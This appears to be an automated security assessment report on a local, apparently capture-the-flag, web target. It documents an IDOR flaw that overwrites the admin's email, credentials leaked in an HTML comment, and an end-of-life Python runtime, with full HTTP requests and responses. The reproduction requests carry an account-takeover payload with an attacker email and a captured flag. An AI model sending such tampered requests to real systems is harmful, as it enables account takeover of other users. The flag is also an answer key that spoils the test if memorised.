# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. HIGH — idor-write Broken object-level authorization: arbitrary account email overwrite via hidden `username` field on POST /profile](#finding-1)
    - [2. MEDIUM — info-disclosure Valid credentials disclosed in login page HTML source comment](#finding-2)
    - [3. MEDIUM — vulnerable-component Outdated Python runtime 3.8.20 — end-of-life (2024-10-07), no security updates](#finding-3)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mqzuvief-ey5e5s` |
| Target | http://target.local:32787/ |
| Started | 2026-06-29T23:35:25.920Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 3 mapped · 3 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 3 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32787`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

3 finding(s): 1 high, 2 medium

## Findings

<a id="finding-1"></a>

### 1. [HIGH] [idor-write] Broken object-level authorization: arbitrary account email overwrite via hidden `username` field on POST /profile

- Screen: `s-0003`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32787/

POST /profile updates the email address of the user named in the request body's `username` field instead of the user identified by the authenticated session. The update form ships `username` as a hidden field pre-filled with the session user ("test"), but the server performs no check that the body `username` matches the session identity. Authenticated as the low-privilege user "test", submitting `username=admin` causes the server to update ANOTHER account's (admin's) email; the application returns a marker (flag) emitted only on a cross-user write. This is a broken object-level authorization (IDOR-write / BOLA) flaw: any authenticated user can overwrite the email address of any other account, including admin, by changing a single client-controlled parameter. Because the overwritten email can then be used to initiate a password reset, this is a direct account-takeover vector against arbitrary users including the administrator.

**Reproduction**

```
1. Log in as the low-privilege user "test" (Flask session cookie {"username":"test"}).
2. Negative control — repeat the cross-user write UNAUTHENTICATED: POST /profile, headers cookie:"" authorization:"", body `email=attacker_controlled@evil.com&username=admin`. Returns 302 redirect to /, body len 189, no write, no flag (ev-mqzvf8kv-1n) — confirms the endpoint requires a session.
3. Attack (authenticated as test) — POST /profile, body `email=attacker_controlled@evil.com&username=admin`. Returns 200, body len 782, containing `flag{3bbed7f1-9d5b-4d08-bcd6-a819360ee9ea}`, proving the server applied the email update to the admin account rather than to the session user "test". Replayed twice, stable (ev-mqzvfa0k-1o, ev-mqzvfbaf-1p).
4. Cross-check: a legitimate same-user write (body username=test) returns 200 with NO flag (len 732/735, ev-mqzvczj8-1i, ev-mqzvdq0k-1k), and the page header stays `<h1>Welcome, test</h1>`, confirming the session identity is unchanged while the write targeted "admin".
Fix: derive the target account from the authenticated session only; never trust a client-supplied `username` to select the object being modified.
```

**Evidence**

- Evidence `ev-mqzvf8kv-1n` — `artifacts/s-0003/ev-mqzvf8kv-1n/`

Request:

```http
POST /profile HTTP/1.1
Host: target.local:32787
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded
authorization: <redacted>

email=attacker_controlled@evil.com&username=admin
```

Response:

```http
HTTP/1.1 302
connection: close
content-length: 189
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 23:50:46 GMT
location: /
server: Werkzeug/3.0.6 Python/3.8.20

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
```

- Evidence `ev-mqzvfa0k-1o` — `artifacts/s-0003/ev-mqzvfa0k-1o/`

Request:

```http
POST /profile HTTP/1.1
Host: target.local:32787
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded

email=attacker_controlled@evil.com&username=admin
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 782
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 23:50:47 GMT
server: Werkzeug/3.0.6 Python/3.8.20
vary: Cookie

<!DOCTYPE html>
<html>
<head>
    <title>Profile</title>
    <link rel="stylesheet" type="text/css" href="/static/styles.css">
</head>
<body>
    <div class="profile-container">
        <h1>Welcome, test</h1>
        
            <p>Email updated successfully!flag{3bbed7f1-9d5b-4d08-bcd6-a819360ee9ea}</p>
        
        <form action="/logout" method="post">
            <button type="submit">Logout</button>
        </form>
        <h2>Update Email</h2>
        <form action="/profile" method="post">
            <input type="email" name="email" placeholder="New Email" value="attacker_controlled@evil.com" required>
            <input type="hidden" name="username" value="test">
            <button type="submit">Update Email</button>
        </form>
    </div>
</body>
</html>
```

- Evidence `ev-mqzvfbaf-1p` — `artifacts/s-0003/ev-mqzvfbaf-1p/`

Request:

```http
POST /profile HTTP/1.1
Host: target.local:32787
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded

email=attacker_controlled@evil.com&username=admin
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 782
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 23:50:49 GMT
server: Werkzeug/3.0.6 Python/3.8.20
vary: Cookie

<!DOCTYPE html>
<html>
<head>
    <title>Profile</title>
    <link rel="stylesheet" type="text/css" href="/static/styles.css">
</head>
<body>
    <div class="profile-container">
        <h1>Welcome, test</h1>
        
            <p>Email updated successfully!flag{3bbed7f1-9d5b-4d08-bcd6-a819360ee9ea}</p>
        
        <form action="/logout" method="post">
            <button type="submit">Logout</button>
        </form>
        <h2>Update Email</h2>
        <form action="/profile" method="post">
            <input type="email" name="email" placeholder="New Email" value="attacker_controlled@evil.com" required>
            <input type="hidden" name="username" value="test">
            <button type="submit">Update Email</button>
        </form>
    </div>
</body>
</html>
```

<a id="finding-2"></a>

### 2. [MEDIUM] [info-disclosure] Valid credentials disclosed in login page HTML source comment

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32787/

The unauthenticated login page (GET /) embeds an HTML comment `<!-- test:test -->` in its source that discloses valid working account credentials (username `test`, password `test`). Any visitor who views page source obtains a usable account. The credentials were confirmed valid: POST /login with username=test&password=test returns 302 → /profile and issues a Flask session cookie (ev-mqzv3jma-j). This is sensitive information disclosure / hardcoded credentials in source. Severity medium: the leaked account is the standard low-privilege `test` user, but the exposure trivially defeats authentication for that account.

**Reproduction**

```
1) Request GET / with no session cookie → 200, body (524 bytes) contains the literal comment `<!-- test:test -->` (ev-mqzv1c11-d, ev-mqzv2vx0-g). 2) Use the disclosed pair: POST /login (form-encoded) username=test&password=test → 302 redirect to /profile with Set-Cookie session (ev-mqzv3jma-j), proving the leaked credentials are valid. Negative control: GET / WITH a valid session returns a 302 redirect (203 bytes) to /profile and never serves the login HTML, so the comment is absent (ev-mqzuzbn4-1).
```

**Evidence**

- Evidence `ev-mqzuzbn4-1` — `artifacts/s-0001/ev-mqzuzbn4-1/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32787
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 302
connection: close
content-length: 203
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 23:38:23 GMT
location: /profile
server: Werkzeug/3.0.6 Python/3.8.20

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/profile">/profile</a>. If not, click the link.
```

- Evidence `ev-mqzv1c11-d` — `artifacts/s-0001/ev-mqzv1c11-d/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32787
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 524
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 23:39:57 GMT
server: Werkzeug/3.0.6 Python/3.8.20

<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <link rel="stylesheet" type="text/css" href="/static/styles.css">
</head>
<body>
    <div class="login-container">
        <h1>Login</h1>
        <!-- test:test -->
        <form action="/login" method="post">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
```

- Evidence `ev-mqzv2vx0-g` — `artifacts/s-0001/ev-mqzv2vx0-g/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32787
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 524
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 23:41:09 GMT
server: Werkzeug/3.0.6 Python/3.8.20

<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <link rel="stylesheet" type="text/css" href="/static/styles.css">
</head>
<body>
    <div class="login-container">
        <h1>Login</h1>
        <!-- test:test -->
        <form action="/login" method="post">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
```

<a id="finding-3"></a>

### 3. [MEDIUM] [vulnerable-component] Outdated Python runtime 3.8.20 — end-of-life (2024-10-07), no security updates

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32787/

VERSION-BASED finding (matched by banner, not exploited). The `Server` response header on every endpoint reveals `Werkzeug/3.0.6 Python/3.8.20`. CPython 3.8 reached END-OF-LIFE on 2024-10-07, and 3.8.20 (Sep 2024) was the final release of the 3.8 series — it receives no further security patches. Any vulnerability disclosed after EOL is permanently unpatched in this deployment. Concrete post-EOL example: CVE-2024-11168 (improper validation of bracketed hosts in urllib.parse) was fixed in 3.9.21 / 3.10.16 / 3.11.11 / 3.12.8 / 3.13.1 but NOT in the EOL 3.8 line, so it remains live here; further CPython CVEs disclosed through 2025 (e.g. the tarfile extraction-filter series) will likewise never be backported. Werkzeug 3.0.6 itself is NOT recorded — it was the Oct-2024 security release that fixed CVE-2024-49766/CVE-2024-49767 and has no known unpatched CVE; however the banner also indicates the app is served by the Werkzeug development server, which the operator should review separately (production-server misconfig, outside A06). Operator should VERIFY the runtime version and upgrade to a supported CPython (3.12.x / 3.13.x) before relying on this assessment.

**Reproduction**

```
1. GET http://target.local:32787/login (or any endpoint). 2. Inspect the `Server` response header → `Werkzeug/3.0.6 Python/3.8.20`. 3. The `Python/3.8.20` token identifies an EOL runtime (3.8 EOL 2024-10-07; 3.8.20 = final release). Reproduced on two consecutive 200 responses; the 404 control returns a distinguishable response from the same banner-bearing server.
```

**Evidence**

- Evidence `ev-mqzvmnhw-26` — `artifacts/_/ev-mqzvmnhw-26/`

Request:

```http
GET /verdict-nonexistent-404-control HTTP/1.1
Host: target.local:32787
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 404
connection: close
content-length: 207
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 23:56:31 GMT
server: Werkzeug/3.0.6 Python/3.8.20

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

- Evidence `ev-mqzvmlqw-24` — `artifacts/_/ev-mqzvmlqw-24/`

Request:

```http
GET /login HTTP/1.1
Host: target.local:32787
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 524
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 23:56:29 GMT
server: Werkzeug/3.0.6 Python/3.8.20

<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <link rel="stylesheet" type="text/css" href="/static/styles.css">
</head>
<body>
    <div class="login-container">
        <h1>Login</h1>
        <!-- test:test -->
        <form action="/login" method="post">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
```

- Evidence `ev-mqzvmmu3-25` — `artifacts/_/ev-mqzvmmu3-25/`

Request:

```http
GET /login HTTP/1.1
Host: target.local:32787
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 524
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 23:56:31 GMT
server: Werkzeug/3.0.6 Python/3.8.20

<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <link rel="stylesheet" type="text/css" href="/static/styles.css">
</head>
<body>
    <div class="login-container">
        <h1>Login</h1>
        <!-- test:test -->
        <form action="/login" method="post">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
```
